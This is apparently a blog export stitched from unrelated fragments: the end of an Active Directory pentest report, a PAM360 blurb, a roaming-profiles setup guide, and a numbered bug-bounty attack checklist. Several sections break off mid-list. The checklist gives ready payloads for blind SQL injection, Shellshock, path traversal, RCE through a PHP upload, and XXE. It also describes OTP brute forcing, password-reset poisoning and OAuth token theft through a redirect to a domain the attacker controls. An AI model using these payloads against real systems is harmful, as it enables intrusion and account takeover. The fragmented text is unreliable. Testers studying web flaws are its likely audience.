The ASREPRoast attack proved effective against the &lt;code&gt;server.web&lt;/code&gt; domain. By employing the Impacket toolkit and the &lt;code&gt;GetNPUser.py&lt;/code&gt; script, AS-REP hashes for domain users were obtained. Following this, &lt;code&gt;John the Ripper&lt;/code&gt; was employed to crack these hashes offline, with the intention of uncovering plaintext passwords linked to the hashed credentials.&lt;/p&gt;

&lt;h2 id=&#34;6-recommendations&#34;&gt;6. Recommendations
&lt;/h2&gt;&lt;p&gt;Based on the findings of our penetration testing of the Active Directory environment, the following recommendations are proposed to strengthen the security posture:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Implement Regular Patch Management:&lt;/strong&gt; Establish a routine patch management process to ensure all servers and applications within the Active Directory environment are up-to-date with the latest security patches and updates.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Enhance Password Policies:&lt;/strong&gt; Enforce stronger password policies, including the use of complex passwords, regular password changes, and multi-factor authentication (MFA) where applicable.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Implement Network Segmentation:&lt;/strong&gt; Segment the network to isolate critical systems and sensitive data from potential attackers. Implement firewall rules and access controls to restrict unauthorized access between network segments.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Conduct Regular Security Training:&lt;/strong&gt; Provide comprehensive security awareness training for employees to educate them about common security threats, phishing attacks, and best practices for safeguarding sensitive information.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Implement Security Monitoring:&lt;/strong&gt; Deploy robust security monitoring tools to continuously monitor the Active Directory environment for suspicious activities, unauthorized access attempts, and potential security breaches.&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;7-risk-assessment&#34;&gt;7. Risk Assessment
&lt;/h2&gt;&lt;p&gt;A comprehensive risk assessment was diligently executed to thoroughly evaluate the potential impact and likelihood of identified vulnerabilities within the Active Directory environment. Risks were meticulously categorized based on severity and meticulously prioritized for remediation, considering their potential impact on business operations and data security.&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;8-regulatory-compliance-considerations&#34;&gt;8. Regulatory Compliance Considerations
&lt;/h2&gt;&lt;p&gt;An assessment was conducted to ascertain compliance of the Active Directory system with key regulations, including the &lt;strong&gt;&lt;code&gt;General Data Protection Regulation (GDPR)&lt;/code&gt;&lt;/strong&gt; for protecting personal data within the EU, the &lt;strong&gt;&lt;code&gt;Health Insurance Portability and Accountability Act (HIPAA)&lt;/code&gt;&lt;/strong&gt; for safeguarding health information in the US, and the &lt;strong&gt;&lt;code&gt;Payment Card Industry Data Security Standard (PCI DSS)&lt;/code&gt;&lt;/strong&gt; for securing credit card data. Subsequent recommendations were provided to ensure alignment with these regulations and to maintain the confidentiality and security of data.&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;9-long-term-security-considerations&#34;&gt;9. Long-Term Security Considerations
&lt;/h2&gt;&lt;p&gt;To ensure ongoing security in the Active Directory environment, it&amp;rsquo;s important to plan for long-term improvements. This could involve identifying key security objectives, establishing regular security assessments, implementing continuous monitoring measures, and providing ongoing security training for staff. By taking a proactive approach to long-term security, the organization can better protect its IT infrastructure against evolving threats.&lt;/p&gt;

&lt;/h1&gt;&lt;p&gt;Active Directory (AD) is a directory service that Microsoft developed for the Windows domain networks. It is included in most Windows Server operating systems. It provides a variety of features, such as user and resource management and Certificate Services, which are essential for a secure IT environment.&lt;/p&gt;
&lt;p&gt;PAM360, on the other hand, is a comprehensive privileged access management solution that helps businesses consolidate and manage their privileged accounts. It provides a single console from which you can manage privileged access, monitor sessions, and record all activities related to privileged access to ensure security and compliance.&lt;/p&gt;
&lt;p&gt;Together, AD and PAM360 can provide a secure and efficient environment for managing user access and privileges. PAM360&amp;rsquo;s integration with Active Directory can help streamline the process of managing privileged accounts, making it easier to ensure that the right people have the right access at the right time.&lt;/p&gt;

&lt;/h1&gt;&lt;hr&gt;
&lt;h2 id=&#34;introduction-2&#34;&gt;Introduction:
&lt;/h2&gt;&lt;p&gt;Roaming profiles allow users to access their personalized desktop environment from any computer within a network. This guide outlines the steps to create and implement Roaming Profiles using Group Policy Management within a domain.&lt;/p&gt;
&lt;h2 id=&#34;step-1-folder-setup-1&#34;&gt;Step 1: Folder Setup
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;Create a dedicated folder for Roaming Profiles.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://orangeymango.me/AD-and-Pam360/Untitled.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;Untitled&#34;
	
	
&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Enable sharing for this folder.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://orangeymango.me/AD-and-Pam360/Untitled%201.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;Untitled&#34;
	
	
&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Configure special permissions by accessing advanced settings.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://orangeymango.me/AD-and-Pam360/Untitled%202.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;Untitled&#34;
	
	
&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Disable inheritance for this folder.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://orangeymango.me/AD-and-Pam360/Untitled%203.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;Untitled&#34;
	
	
&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Select users or groups who will have Roaming Profiles.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://orangeymango.me/AD-and-Pam360/Untitled%204.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;Untitled&#34;
	
	
&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Grant the required permissions.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://orangeymango.me/AD-and-Pam360/Untitled%205.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;Untitled&#34;
	
	
&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Copy the generated network path.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://orangeymango.me/AD-and-Pam360/Untitled%206.png&#34;
	
	
	
	loading=&#34;lazy&#34;

&gt;&lt;/p&gt;
&lt;h2 id=&#34;step-2-group-policy-object-creation-1&#34;&gt;Step 2: Group Policy Object Creation
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;Navigate to AppData properties within Group Policy Management console.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://orangeymango.me/AD-and-Pam360/Untitled%207.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;Untitled&#34;
	
	
&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Configure preferred settings and specify the network path for Roaming Profiles.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://orangeymango.me/AD-and-Pam360/Untitled%208.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;Untitled&#34;
	
	
&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;After logging in from a user, the Roaming Profile will be created in the network folder on the Windows Server.&lt;/li&gt;
&lt;/ul&gt;

&lt;li&gt;Burp Collaborator&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;For exploitation, try:
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;any.com/index/php?uri=http://external.com&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Read file from server (e.g., &lt;code&gt;file:///identf&lt;/code&gt; using LFI payloads)&lt;/li&gt;
&lt;li&gt;Scan internal network (e.g., &lt;code&gt;http://localhost:1&lt;/code&gt; changing the port number to common ports like 21, 22)&lt;/li&gt;
&lt;li&gt;SSRF with RFI: Execute code from the external domain (e.g., use &lt;code&gt;hackoff.html&lt;/code&gt; with XSS script)&lt;strong&gt;Tool Used:&lt;/strong&gt; Burp Collaborator / &lt;code&gt;https://www.expressvpn.com/what-is-my-ip&lt;/code&gt;&lt;/li&gt;

&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Use payloads from:
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;15-subdomain-takeover&#34;&gt;15. Subdomain Takeover
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;If the website is not in use by the target and is hosted on a service provider:
&lt;ul&gt;
&lt;li&gt;Sign up on service providers like GitHub, Heroku, Shopify, Zendesk, AWS, Tumblr, etc., to attempt domain takeover&lt;strong&gt;Tool Used:&lt;/strong&gt; &lt;code&gt;github.com/nahamsec/HostileSubBruteforcer&lt;/code&gt;&lt;/li&gt;

&lt;/ul&gt;
&lt;h3 id=&#34;16-command-injection&#34;&gt;16. Command Injection
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Take input as a command and reflect the output of that command.&lt;/li&gt;
&lt;li&gt;Common parameters to look for:
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;daemon&lt;/code&gt;, &lt;code&gt;host&lt;/code&gt;, &lt;code&gt;upload&lt;/code&gt;, &lt;code&gt;dir&lt;/code&gt;, &lt;code&gt;execute&lt;/code&gt;, &lt;code&gt;download&lt;/code&gt;, &lt;code&gt;log&lt;/code&gt;, &lt;code&gt;ip&lt;/code&gt;, &lt;code&gt;cli&lt;/code&gt;, &lt;code&gt;cmd&lt;/code&gt;, &lt;code&gt;filename&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Find command injection using delimiter list (e.g., &lt;code&gt;;&lt;/code&gt;, &lt;code&gt;^&lt;/code&gt;, &lt;code&gt;&amp;amp;&lt;/code&gt;, &lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt;, &lt;code&gt;|&lt;/code&gt;, &lt;code&gt;||&lt;/code&gt;, &lt;code&gt;%0D&lt;/code&gt;, &lt;code&gt;%0A&lt;/code&gt;, &lt;code&gt;\\n&lt;/code&gt;, &lt;code&gt;&amp;lt;&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;Identify input fields interacting with the OS shell.&lt;/li&gt;
&lt;li&gt;Try with delimiter &amp;amp; shell commands (e.g., &lt;code&gt;;dir&lt;/code&gt;, &lt;code&gt;;/etc/passwd&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;Intercept requests using Clusterbomb - first parameter for delimiter &amp;amp; second for command payloads&lt;strong&gt;Tool Used:&lt;/strong&gt; &lt;code&gt;github.com/commixproject/commix.git&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;17-file-upload-vulnerability&#34;&gt;17. File Upload Vulnerability
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Simple file upload (e.g., &lt;code&gt;shell.php&lt;/code&gt;) for full control of the server and running shell commands.&lt;/li&gt;
&lt;li&gt;Use payloads from:
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;github.com/fuzzdb-projects/fuzzdb/tree/master/attack/file-upload/malicious-images&lt;/code&gt;&lt;/li&gt;

&lt;h3 id=&#34;18-xxe-injection-xml-external-entity-injection&#34;&gt;18. XXE Injection (XML External Entity Injection)
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Use XXE payloads in Intruder to detect.&lt;/li&gt;
&lt;li&gt;Check if the website is accepting &lt;code&gt;content-type=text/xml&lt;/code&gt; header with a &lt;code&gt;200 OK&lt;/code&gt; response.&lt;/li&gt;
&lt;li&gt;Use online tool &lt;code&gt;pingb.in&lt;/code&gt; to check for external ping.&lt;/li&gt;
&lt;li&gt;For blind XXE, use Python’s SimpleHTTPServer (e.g., &lt;code&gt;python -m SimpleHTTPServer 80&lt;/code&gt;).&lt;/li&gt;
&lt;li&gt;SYSTEM &lt;code&gt;file:///etc/passwd&lt;/code&gt; for local file read.&lt;/li&gt;
&lt;li&gt;SYSTEM &lt;code&gt;http://systemip/readinganyfile&lt;/code&gt; for blind XXE.&lt;/li&gt;
&lt;li&gt;Use &lt;code&gt;php://&lt;/code&gt; for Remote Code Execution (RCE).&lt;/li&gt;
&lt;li&gt;Use Gopher or other URI handlers to exploit XXE.&lt;strong&gt;Common Places to Find XXE:&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;XML file upload (e.g., config files)&lt;/li&gt;
&lt;li&gt;XML input fields&lt;/li&gt;
&lt;li&gt;XML-based APIs&lt;/li&gt;
&lt;li&gt;XML-based files (e.g., RSS, SVG)&lt;strong&gt;Tool Used:&lt;/strong&gt; &lt;code&gt;pingb.in&lt;/code&gt; / Burp Suite&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;19-account-lockout&#34;&gt;19. Account Lockout
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Prevent brute-force attacks.&lt;/li&gt;
&lt;li&gt;Intercept the login page with user credentials using Burp Suite.&lt;/li&gt;
&lt;li&gt;Send the request to Sequencer.&lt;/li&gt;
&lt;li&gt;Alternatively, use Intruder to make multiple requests (e.g., 1000 times).&lt;/li&gt;
&lt;li&gt;Perform credential stuffing.&lt;/li&gt;
&lt;li&gt;Ensure the account locks out for 30 minutes to 24 hours.****&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;20-blind-xss&#34;&gt;20. Blind XSS
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;A type of stored XSS where attacker input is saved in the server and stored in the database.&lt;/li&gt;
&lt;li&gt;It won’t be reflected immediately.&lt;/li&gt;
&lt;li&gt;Look for blind XSS in pages like:
&lt;ul&gt;
&lt;li&gt;Contact us&lt;/li&gt;
&lt;li&gt;Log viewers&lt;/li&gt;
&lt;li&gt;Feedback pages&lt;/li&gt;
&lt;li&gt;Chat apps&lt;/li&gt;
&lt;li&gt;Ticket generation apps&lt;/li&gt;
&lt;li&gt;Any app using moderation or updates&lt;/li&gt;
&lt;li&gt;Saving forms&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Use the online tool &lt;code&gt;xsshunter.com&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Copy the payload and paste it in the input field.&lt;/li&gt;
&lt;li&gt;Reflection will be found on &lt;code&gt;xsshunter.com&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Perform multiple blind XSS using Intruder.**** / &lt;a class=&#34;link&#34; href=&#34;http://xsshunter.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;XSSHunter.com&lt;/a&gt;&lt;/li&gt;

&lt;h3 id=&#34;21-buffer-overflow-web&#34;&gt;21. Buffer Overflow (Web)
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Intercept the login page and pass a long string of passwords or other inputs. Observe if the page loads slowly.&lt;/li&gt;
&lt;li&gt;Types of overflows to consider: Buffer, Stack, Heap, Integer, Format String.&lt;/li&gt;
&lt;li&gt;Denial of Service (DoS) attacks using buffer overflow can be attempted.****&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;22-cms-vulnerability-hunting&#34;&gt;22. CMS Vulnerability Hunting
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Target common CMS platforms: WordPress, Joomla, Drupal, vBulletin, Magento.&lt;/li&gt;
&lt;li&gt;Identify vulnerable components within the CMS.&lt;/li&gt;
&lt;li&gt;Search for exploits using Google.&lt;strong&gt;Tools Used:&lt;/strong&gt; WPScan, CMSMap, CMSSCAN, Joomscan, Drupwn, vBulletin Scanner, Mage Scanner, OWASP VBScan&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;23-idor-insecure-direct-object-references&#34;&gt;23. IDOR (Insecure Direct Object References)
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Scenario 1:&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Often found in user settings or profile management.&lt;/li&gt;
&lt;li&gt;Requires two accounts.&lt;/li&gt;
&lt;li&gt;Intercept the request and change the email ID of the attacker.&lt;/li&gt;
&lt;li&gt;Log out and attempt to log in with the victim&amp;rsquo;s account to see if the change was successful.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;Scenario 2: User Moderation:&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Find the user ID.&lt;/li&gt;
&lt;li&gt;Replace the victim’s ID with the attacker’s ID.&lt;/li&gt;
&lt;li&gt;Perform the functionality to see if access is granted.****&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;24-long-password-dos-attack&#34;&gt;24. Long Password DoS Attack
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Hashing passwords can be resource-intensive, leading to potential DoS.&lt;/li&gt;
&lt;li&gt;Similar to buffer overflow attacks but specifically targeting password fields without length limits.&lt;/li&gt;
&lt;li&gt;Sign up for an account and intercept the request.&lt;/li&gt;
&lt;li&gt;Input a password longer than the typical length and forward the request.&lt;/li&gt;
&lt;li&gt;This can cause application DoS.****&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;25-no-rate-limiting-vulnerability-logical-flow&#34;&gt;25. No Rate Limiting Vulnerability (Logical Flow)
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Capture the forgot password page or any similar request with Burp Suite.&lt;/li&gt;
&lt;li&gt;Send the request to Intruder.&lt;/li&gt;
&lt;li&gt;Make multiple requests (e.g., 1000 times) to test for rate limiting issues.&lt;/li&gt;
&lt;li&gt;This can impact both user and server performance.****&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;26-password-reset-poisoning&#34;&gt;26. Password Reset Poisoning
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Intercept the forgot password page with Burp Suite.&lt;/li&gt;
&lt;li&gt;Perform a host header attack.&lt;/li&gt;
&lt;li&gt;The victim will receive a password reset email from an &amp;ldquo;evil&amp;rdquo; website specified in the host header.****&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;27-broken-access-control&#34;&gt;27. Broken Access Control
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;IDOR Example:&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;Access with account 1: &lt;code&gt;https://acme.com/changepw/id?=1234&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Create a second account and access it: &lt;code&gt;https://acme.com/changepw/id?=5678&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Logout from account 1, log into account 2, and attempt to change the password of account 1 by modifying the user ID in the request.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Hash-Based IDOR:&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;User IDs might be hashed (e.g., Base64).&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Local File Inclusion (LFI) &amp;amp; Path Traversal:&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;Example request: &lt;code&gt;GET /view?pg=../../../../../etc/passwd%00&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Common Parameters to Look For:&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;id&lt;/code&gt;, &lt;code&gt;user&lt;/code&gt;, &lt;code&gt;account&lt;/code&gt;, &lt;code&gt;number&lt;/code&gt;, &lt;code&gt;order&lt;/code&gt;, &lt;code&gt;no&lt;/code&gt;, &lt;code&gt;doc&lt;/code&gt;, &lt;code&gt;key&lt;/code&gt;, &lt;code&gt;email&lt;/code&gt;, &lt;code&gt;group&lt;/code&gt;, &lt;code&gt;profile&lt;/code&gt;, &lt;code&gt;edit&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Functions to Test:&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;Change email, change password, upgrade/downgrade user role, create/remove/update/delete context-specific app data (e.g., shipping, invoices, document viewing).&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Missing Function Level Access Control:&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;Forceful browsing (e.g., &lt;code&gt;GET /admin/viewTransactions&lt;/code&gt;, &lt;code&gt;GET /ADMIN/viewTransactions&lt;/code&gt;)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Parameter Manipulation &amp;amp; Logic Bugs:&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;Example: Giving a negative price.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Logic Flow Vulnerabilities in E-commerce:&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;Skipping steps in workflows (e.g., &lt;code&gt;additem-&amp;gt;checkout-&amp;gt;enter shipping info-&amp;gt;payment&lt;/code&gt;).&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;Tools Used:&lt;/strong&gt; Burp Suite Extensions (AuthMatrix, AuthZ, Authorize, AutoRepeater)&lt;/p&gt;
&lt;h3 id=&#34;28-account-takeover-via-forgot-password-page&#34;&gt;28. Account Takeover via Forgot Password Page
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Intercept the forgot password page with Burp Suite.&lt;/li&gt;
&lt;li&gt;Add &lt;code&gt;X-Forwarded-Host: bing.com&lt;/code&gt; to the request header.&lt;/li&gt;
&lt;li&gt;Forward the request to test for account takeover vulnerabilities.****&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;29-broken-access-control&#34;&gt;29. Broken Access Control
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Create an account.&lt;/li&gt;
&lt;li&gt;Change the email ID from A to B.&lt;/li&gt;
&lt;li&gt;Generate a forgot password request for email A.&lt;/li&gt;
&lt;li&gt;Repeat the same process for passwords.****&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;30-rate-limiting-bypass&#34;&gt;30. Rate Limiting Bypass
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Intercept the forgot password page with Burp Suite.&lt;/li&gt;
&lt;li&gt;Send the request to Intruder.&lt;/li&gt;
&lt;li&gt;Add &lt;code&gt;X-Forwarded-Host: bing.com&lt;/code&gt; to the request header.&lt;/li&gt;
&lt;li&gt;Target the request to email and forward it to test for rate limiting bypass.****&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;31-lack-of-password-confirmation&#34;&gt;31. Lack of Password Confirmation
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Required for actions such as deleting an account or changing an email ID.&lt;/li&gt;
&lt;li&gt;Verify that a password confirmation step is missing in these processes.****&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;32-2fa-or-otp-bypass&#34;&gt;32. 2FA or OTP Bypass
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Complete the registration process and request an OTP code.&lt;/li&gt;
&lt;li&gt;Intercept the OTP request using Burp Suite.&lt;/li&gt;
&lt;li&gt;Send the intercepted request to Intruder.&lt;/li&gt;
&lt;li&gt;Bruteforce the 6-digit OTP through Burp Intruder if there’s no rate limiting or CAPTCHA.&lt;/li&gt;
&lt;li&gt;Analyze content length and attempt multiple combinations until bypassing OTP verification.****&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;33-blind-sql-injection&#34;&gt;33. Blind SQL Injection
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Check input fields and insert payloads such as &lt;code&gt;id=1&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Insert payloads in user-agent or other input parameters.&lt;/li&gt;
&lt;li&gt;Confirm by changing the time interval with payloads like:
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;id=5+and+1=2&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#39;,0)waitfor delay&#39;0:0:05&#39;--&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;if(now()=sysdate(),sleep(5),0)) --&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;(select(0)from(select(sleep(3)))v)/*&#39;+(select(3)from(select(sleep(3)))v)+&#39;&amp;quot;&amp;quot;+(select(0)from(select(sleep(3)))v)+&amp;quot;&amp;quot;*/&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;0&#39;XOR(if(now()=sysdate(),sleep(3),0))XOR&#39;Z&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#39; and extractvalue(1,concat(0x0a,@@version)) or&lt;/code&gt;**** or Cookie Manager&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;34-remote-code-execution-vulnerability&#34;&gt;34. Remote Code Execution Vulnerability
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Visit the target website and create an account.&lt;/li&gt;
&lt;li&gt;Verify the email address and navigate to profile settings.&lt;/li&gt;
&lt;li&gt;Upload a malicious file (e.g., &lt;code&gt;RCE.php%00.gif&lt;/code&gt;) as the company logo and save.&lt;/li&gt;
&lt;li&gt;View the uploaded image URL and append &lt;code&gt;?cmd=id&lt;/code&gt; to execute the &lt;code&gt;id&lt;/code&gt; command.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;Scenario 2:&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Crawl the target website using Burp Suite.&lt;/li&gt;
&lt;li&gt;Check for &lt;code&gt;/cgi-bin/status&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Send to Repeater and replace &lt;code&gt;User-Agent&lt;/code&gt; with payload like &lt;code&gt;{:;};echo $(&amp;lt;/etc/passwd)&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Send the request to see if it reveals root user info.**** or Manual&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;35-stealing-oauth-token&#34;&gt;35. Stealing OAuth Token
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Log in using a third-party app (e.g., Facebook, Gmail).&lt;/li&gt;
&lt;li&gt;Intercept the request using Burp Suite.&lt;/li&gt;
&lt;li&gt;Modify &lt;code&gt;redirect_url&lt;/code&gt; to a domain you control (e.g., &lt;code&gt;bugbountypoc.com&lt;/code&gt;).&lt;/li&gt;
&lt;li&gt;If necessary, change the &lt;code&gt;referer&lt;/code&gt; header to the same domain.****&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;36-external-service-interaction&#34;&gt;36. External Service Interaction
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Capture the request using Burp Suite.&lt;/li&gt;
&lt;li&gt;Send the request to Repeater.&lt;/li&gt;
&lt;li&gt;Replace &lt;code&gt;Host&lt;/code&gt; header with Burp Collaborator payload or add a new &lt;code&gt;X-Forwarded-For&lt;/code&gt; header with the same payload.&lt;/li&gt;
&lt;li&gt;Forward the request and check if Burp Collaborator receives a DNS lookup request.****&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;37-server-side-include-ssi-injection&#34;&gt;37. Server-Side Include (SSI) Injection
